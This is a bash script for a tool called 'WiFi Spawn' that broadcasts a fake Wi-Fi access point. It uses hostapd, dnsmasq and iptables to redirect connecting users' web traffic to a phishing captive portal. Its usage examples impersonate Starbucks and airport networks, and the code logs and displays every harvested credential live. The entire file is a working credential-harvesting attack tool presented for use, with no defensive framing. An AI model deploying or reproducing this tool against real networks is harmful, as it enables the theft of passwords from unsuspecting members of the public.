#!/bin/bash

# WiFi Spawn - Fake Access Point with Captive Portal
# Usage: sudo ./wifispawn.sh <SSID> <interface> [page]

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
SSID="${1:-FreeWiFi}"
INTERFACE="${2:-wlan0}"
PAGE_TYPE="${3:-portal}"
INTERNET_INTERFACE="${4:-}"
GATEWAY_IP="192.168.4.1"
DHCP_RANGE="192.168.4.2,192.168.4.50"
WEB_PORT="80"
CREDS_PORT="8080"

# Internet sharing options
PROVIDE_INTERNET="${PROVIDE_INTERNET:-false}"
AUTO_DETECT_INTERNET="${AUTO_DETECT_INTERNET:-true}"
REQUIRE_AUTH_FOR_INTERNET="${REQUIRE_AUTH_FOR_INTERNET:-true}"

# Directories
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PAGES_DIR="$SCRIPT_DIR/pages"
WORK_DIR="/tmp/wifispawn"
WEB_DIR="$WORK_DIR/www"
LOGS_DIR="$WORK_DIR/logs"

# Files
HOSTAPD_CONF="$WORK_DIR/hostapd.conf"
DNSMASQ_CONF="$WORK_DIR/dnsmasq.conf"
CREDS_FILE="$LOGS_DIR/credentials.log"

print_banner() {
    echo -e "${GREEN}"
    echo "██╗    ██╗██╗███████╗██╗███████╗██████╗  █████╗ ██╗    ██╗███╗   ██╗"
    echo "██║    ██║██║██╔════╝██║██╔════╝██╔══██╗██╔══██╗██║    ██║████╗  ██║"
    echo "██║ █╗ ██║██║█████╗  ██║███████╗██████╔╝███████║██║ █╗ ██║██╔██╗ ██║"
    echo "██║███╗██║██║██╔══╝  ██║╚════██║██╔═══╝ ██╔══██║██║███╗██║██║╚██╗██║"
    echo "╚███╔███╔╝██║██║     ██║███████║██║     ██║  ██║╚███╔███╔╝██║ ╚████║"
    echo " ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝"
    echo -e "${NC}"
    echo -e "${YELLOW}Fake Access Point with Captive Portal${NC}"
    echo "=========================================="
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}This script must be run as root${NC}"
        exit 1
    fi
}

list_available_pages() {
    echo -e "${BLUE}Available portal pages:${NC}"
    echo "========================"
    
    if [[ -d "$PAGES_DIR" ]]; then
        for page in "$PAGES_DIR"/*.html; do
            if [[ -f "$page" ]]; then
                local basename=$(basename "$page" .html)
                echo -e "${GREEN}  • $basename${NC} - $(basename "$page")"
            fi
        done
    else
        echo -e "${RED}Pages directory not found: $PAGES_DIR${NC}"
        exit 1
    fi
    
    echo ""
    echo "Usage: $0 <SSID> <INTERFACE> [PAGE]"
    echo "Example: $0 'FreeWiFi' wlan0 starbucks"
}

validate_page() {
    local page_file="$PAGES_DIR/$PAGE_TYPE.html"
    
    if [[ ! -f "$page_file" ]]; then
        echo -e "${RED}Error: Page '$PAGE_TYPE' not found!${NC}"
        echo -e "${RED}File not found: $page_file${NC}"
        echo ""
        list_available_pages
        exit 1
    fi
    
    echo -e "${GREEN}[+] Using portal page: $PAGE_TYPE${NC}"
    return 0
}

detect_internet_interface() {
    echo -e "${YELLOW}[+] Detecting internet connection...${NC}"
    
    # Check if internet interface was manually specified
    if [[ -n "$INTERNET_INTERFACE" ]]; then
        if ip route | grep -q "default.*$INTERNET_INTERFACE"; then
            echo -e "${GREEN}[+] Using specified internet interface: $INTERNET_INTERFACE${NC}"
            return 0
        else
            echo -e "${RED}Specified interface $INTERNET_INTERFACE has no internet connection${NC}"
            return 1
        fi
    fi
    
    # Auto-detect internet interface
    INTERNET_INTERFACE=$(ip route | grep '^default' | awk '{print $5}' | head -1)
    
    if [[ -n "$INTERNET_INTERFACE" ]]; then
        # Test internet connectivity
        if ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1; then
            echo -e "${GREEN}[+] Internet detected via interface: $INTERNET_INTERFACE${NC}"
            PROVIDE_INTERNET="true"
            return 0
        else
            echo -e "${YELLOW}[!] Interface found but no internet connectivity${NC}"
            PROVIDE_INTERNET="false"
            return 1
        fi
    else
        echo -e "${YELLOW}[!] No internet connection detected${NC}"
        PROVIDE_INTERNET="false"
        return 1
    fi
}

setup_internet_sharing() {
    if [[ "$PROVIDE_INTERNET" == "true" && -n "$INTERNET_INTERFACE" ]]; then
        echo -e "${YELLOW}[+] Setting up internet sharing...${NC}"
        
        # Enable IP forwarding
        echo 1 > /proc/sys/net/ipv4/ip_forward
        
        # Set up NAT (masquerading) to share internet
        iptables -t nat -A POSTROUTING -o "$INTERNET_INTERFACE" -j MASQUERADE
        iptables -A FORWARD -i "$INTERNET_INTERFACE" -o "$INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
        iptables -A FORWARD -i "$INTERFACE" -o "$INTERNET_INTERFACE" -j ACCEPT
        
        echo -e "${GREEN}[+] Internet sharing enabled via $INTERNET_INTERFACE${NC}"
    else
        echo -e "${YELLOW}[!] No internet sharing (captive portal only)${NC}"
    fi
}

check_dependencies() {
    echo -e "${YELLOW}[+] Checking dependencies...${NC}"
    
    local deps=("hostapd" "dnsmasq" "iptables" "python3" "nginx")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [[ ${#missing[@]} -ne 0 ]]; then
        echo -e "${RED}Missing dependencies: ${missing[*]}${NC}"
        echo "Install with: apt update && apt install -y ${missing[*]}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] All dependencies found${NC}"
}

setup_directories() {
    echo -e "${YELLOW}[+] Setting up directories...${NC}"
    
    mkdir -p "$WORK_DIR" "$WEB_DIR" "$LOGS_DIR"
    touch "$CREDS_FILE"
    
    # Copy selected portal page
    local source_page="$PAGES_DIR/$PAGE_TYPE.html"
    if [[ -f "$source_page" ]]; then
        cp "$source_page" "$WEB_DIR/portal.html"
        echo -e "${GREEN}[+] Portal page copied: $PAGE_TYPE${NC}"
    else
        echo -e "${RED}Error: Portal page not found: $source_page${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Directories created${NC}"
}

cleanup() {
    echo -e "\n${YELLOW}[+] Cleaning up...${NC}"
    
    # Stop services
    killall hostapd 2>/dev/null || true
    killall dnsmasq 2>/dev/null || true
    killall python3 2>/dev/null || true
    systemctl stop nginx 2>/dev/null || true
    
    # Restore iptables from backup if available
    if [[ -f "$LOGS_DIR/iptables.backup" ]]; then
        echo -e "${YELLOW}[+] Restoring iptables rules...${NC}"
        iptables-restore < "$LOGS_DIR/iptables.backup" 2>/dev/null || {
            echo -e "${YELLOW}[!] Could not restore iptables backup, clearing rules...${NC}"
            iptables -F
            iptables -X
            iptables -t nat -F
            iptables -t nat -X
        }
    else
        # Fallback: clear all rules
        iptables -F
        iptables -X
        iptables -t nat -F
        iptables -t nat -X
    fi
    
    # Restore interface
    ip addr flush dev "$INTERFACE"
    ip link set "$INTERFACE" down
    
    echo -e "${GREEN}[+] Cleanup completed${NC}"
    exit 0
}

setup_interface() {
    echo -e "${YELLOW}[+] Setting up wireless interface...${NC}"
    
    # Kill conflicting processes
    airmon-ng check kill 2>/dev/null || true
    
    # Configure interface
    ip link set "$INTERFACE" down
    ip addr add "$GATEWAY_IP/24" dev "$INTERFACE"
    ip link set "$INTERFACE" up
    
    echo -e "${GREEN}[+] Interface $INTERFACE configured${NC}"
}

start_access_point() {
    echo -e "${YELLOW}[+] Starting fake access point...${NC}"
    
    # Start hostapd in background
    hostapd "$HOSTAPD_CONF" &
    sleep 3
    
    echo -e "${GREEN}[+] Access point '$SSID' started${NC}"
}

start_dhcp_dns() {
    echo -e "${YELLOW}[+] Starting DHCP and DNS services...${NC}"
    
    # Start dnsmasq
    dnsmasq -C "$DNSMASQ_CONF" &
    
    echo -e "${GREEN}[+] DHCP and DNS services started${NC}"
}

setup_iptables() {
    echo -e "${YELLOW}[+] Setting up traffic redirection...${NC}"
    
    # Backup current iptables rules
    iptables-save > "$LOGS_DIR/iptables.backup" 2>/dev/null || true
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Clear existing rules
    iptables -F
    iptables -X
    iptables -t nat -F
    iptables -t nat -X
    
    if [[ "$PROVIDE_INTERNET" == "true" && -n "$INTERNET_INTERFACE" ]]; then
        echo -e "${BLUE}[+] Configuring internet sharing mode...${NC}"
        
        # Set up NAT for internet sharing
        iptables -t nat -A POSTROUTING -o "$INTERNET_INTERFACE" -j MASQUERADE
        iptables -A FORWARD -i "$INTERNET_INTERFACE" -o "$INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
        iptables -A FORWARD -i "$INTERFACE" -o "$INTERNET_INTERFACE" -j ACCEPT
        
        if [[ "$REQUIRE_AUTH_FOR_INTERNET" == "true" ]]; then
            # Redirect unauthenticated users to captive portal
            # Allow authenticated users (marked by server) to access internet
            iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 -m mark ! --mark 1 -j DNAT --to-destination "$GATEWAY_IP:$WEB_PORT"
            iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 -m mark ! --mark 1 -j DNAT --to-destination "$GATEWAY_IP:$WEB_PORT"
        else
            # Just redirect initial HTTP requests to show portal, then allow internet
            iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j DNAT --to-destination "$GATEWAY_IP:$WEB_PORT"
            iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 -j DNAT --to-destination "$GATEWAY_IP:$WEB_PORT"
        fi
        
        # Allow traffic to captive portal and credentials server
        iptables -A INPUT -i "$INTERFACE" -p tcp --dport "$WEB_PORT" -j ACCEPT
        iptables -A INPUT -i "$INTERFACE" -p tcp --dport "$CREDS_PORT" -j ACCEPT
        iptables -A INPUT -i "$INTERFACE" -p tcp --dport 53 -j ACCEPT
        iptables -A INPUT -i "$INTERFACE" -p udp --dport 53 -j ACCEPT
        iptables -A INPUT -i "$INTERFACE" -p udp --dport 67 -j ACCEPT
        
    else
        echo -e "${BLUE}[+] Configuring captive portal only mode...${NC}"
        
        # Redirect all HTTP/HTTPS traffic to captive portal
        iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j DNAT --to-destination "$GATEWAY_IP:$WEB_PORT"
        iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 -j DNAT --to-destination "$GATEWAY_IP:$WEB_PORT"
        
        # Allow traffic to captive portal and credentials server
        iptables -A FORWARD -i "$INTERFACE" -p tcp --dport "$WEB_PORT" -j ACCEPT
        iptables -A FORWARD -i "$INTERFACE" -p tcp --dport "$CREDS_PORT" -j ACCEPT
        
        # Drop all other traffic
        iptables -A FORWARD -i "$INTERFACE" -j DROP
    fi
    
    echo -e "${GREEN}[+] Traffic redirection configured${NC}"
}

start_web_services() {
    echo -e "${YELLOW}[+] Starting web services...${NC}"
    
    # Start credentials server
    cd "$WORK_DIR"
    python3 server.py &
    
    # Start web server
    systemctl start nginx
    
    echo -e "${GREEN}[+] Web services started${NC}"
    echo -e "${GREEN}[+] Captive portal: http://$GATEWAY_IP${NC}"
    echo -e "${GREEN}[+] Credentials will be logged to: $CREDS_FILE${NC}"
}

monitor_credentials() {
    echo -e "${YELLOW}[+] Monitoring for credentials...${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
    
    tail -f "$CREDS_FILE" | while read -r line; do
        if [[ -n "$line" ]]; then
            echo -e "${GREEN}[CREDENTIAL CAPTURED]${NC} $line"
        fi
    done
}

main() {
    # Set up signal handlers
    trap cleanup SIGINT SIGTERM
    
    print_banner
    check_root
    validate_page
    check_dependencies
    
    # Detect internet connection for sharing
    detect_internet_interface
    
    echo -e "${YELLOW}SSID: $SSID${NC}"
    echo -e "${YELLOW}Interface: $INTERFACE${NC}"
    echo -e "${YELLOW}Portal Page: $PAGE_TYPE${NC}"
    if [[ "$PROVIDE_INTERNET" == "true" ]]; then
        echo -e "${YELLOW}Internet Sharing: ${GREEN}Enabled${YELLOW} via $INTERNET_INTERFACE${NC}"
    else
        echo -e "${YELLOW}Internet Sharing: ${RED}Disabled${YELLOW} (Portal only)${NC}"
    fi
    echo -e "${YELLOW}Gateway: $GATEWAY_IP${NC}"
    echo ""
    
    setup_directories
    
    # Generate configuration files
    ./generate_configs.sh "$SSID" "$INTERFACE" "$GATEWAY_IP" "$DHCP_RANGE"
    
    setup_interface
    start_access_point
    start_dhcp_dns
    setup_iptables
    start_web_services
    
    echo -e "\n${GREEN}[+] WiFi Spawn is running!${NC}"
    echo -e "${GREEN}[+] Fake AP '$SSID' is broadcasting${NC}"
    
    monitor_credentials
}

# Check arguments
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    echo "Usage: $0 [SSID] [INTERFACE] [PAGE]"
    echo "Examples:"
    echo "  $0 'FreeWiFi' wlan0 portal"
    echo "  $0 'Starbucks_WiFi' wlan0 starbucks"
    echo "  $0 'Airport_WiFi' wlan0 airport"
    echo ""
    list_available_pages
    exit 0
fi

if [[ "$1" == "--list-pages" || "$1" == "-l" ]]; then
    list_available_pages
    exit 0
fi

main "$@"